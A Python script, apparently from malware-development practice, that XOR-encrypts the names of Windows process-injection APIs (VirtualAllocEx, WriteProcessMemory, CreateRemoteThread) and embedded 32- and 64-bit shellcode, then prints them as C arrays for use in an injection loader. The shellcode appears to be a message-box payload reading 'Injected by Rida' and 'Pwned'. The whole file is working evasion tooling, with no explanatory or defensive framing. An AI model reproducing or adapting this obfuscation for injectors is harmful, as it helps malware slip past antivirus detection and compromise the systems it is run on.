
def xor(data: bytes, key: bytes) -> bytes:
    klen = len(key)
    return bytes(b ^ key[i % klen] for i, b in enumerate(data))

API_NAMES = [
    "VirtualAllocEx",
    "WriteProcessMemory",
    "CreateRemoteThread",
    "WaitForSingleObject",
    "VirtualFreeEx",
]

key = b"rzdhop_is_a_nice_guy" 

def to_c_array(data: bytes, varname: str, ctype="UCHAR") -> str:
    hex_vals = ", ".join(f"0x{b:02x}" for b in data)
    return f"{ctype} {varname}[] = {{ {hex_vals} }};"



for name in API_NAMES:
    enc = xor(name.encode() + b"\x00", key)
    c_name = name + "_enc"
    print(to_c_array(enc, c_name))


shellcode_32 = bytes.fromhex(
    "fce88f0000006031d289e5648b52308b520c8b52140fb74a268b722831ff31c0"
    "ac3c617c022c20c1cf0d01c74975ef52578b52108b423c01d08b407885c0744c"
    "01d08b582001d38b48185085c9743c498b348b31ff01d631c0acc1cf0d01c738"
    "e075f4037df83b7d2475e0588b582401d3668b0c4b8b581c01d38b048b01d089"
    "4424245b5b61595a51ffe0585f5a8b12e980ffffff5de80b0000007573657233"
    "322e646c6c00684c772607ffd56a00e80600000050776e656400e81100000049"
    "6e6a65637465642062792052696461006a006845835607ffd5bbe01d2a0a68a6"
    "95bd9dffd583c4283c067c0a80fbe07505bb4713726f6a0053ffd5"
)

shellcode_64 = bytes.fromhex(
    "fc4881e4f0ffffffe8cc00000041514150524831d2515665488b5260488b5218"
    "488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101"
    "c1e2ed52488b522041518b423c4801d0668178180b020f85720000008b808800"
    "00004885c074674801d050448b40208b48184901d0e35648ffc9418b34884801"
    "d64d31c94831c041c1c90dac4101c138e075f14c034c24084539d175d8448b40"
    "244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a4158"
    "4159415a4883ec204152ffe05841595a488b12e94bffffff5de80b0000007573"
    "657233322e646c6c005941ba4c772607ffd549c7c100000000e811000000496e"
    "6a65637465642062792052696461005ae80600000050776e65640041584831c9"
    "41ba45835607ffd5bbe01d2a0a41baa695bd9dffd54883c4283c067c0a80fbe0"
    "7505bb4713726f6a00594189daffd5"
)

enc_shellcode_32 = xor(shellcode_32, key)
enc_shellcode_64 = xor(shellcode_64, key)

print(to_c_array(enc_shellcode_32, "shellcode_32"))
print()
print(to_c_array(enc_shellcode_64, "shellcode_64"))
print()
print(to_c_array(key, "key"))
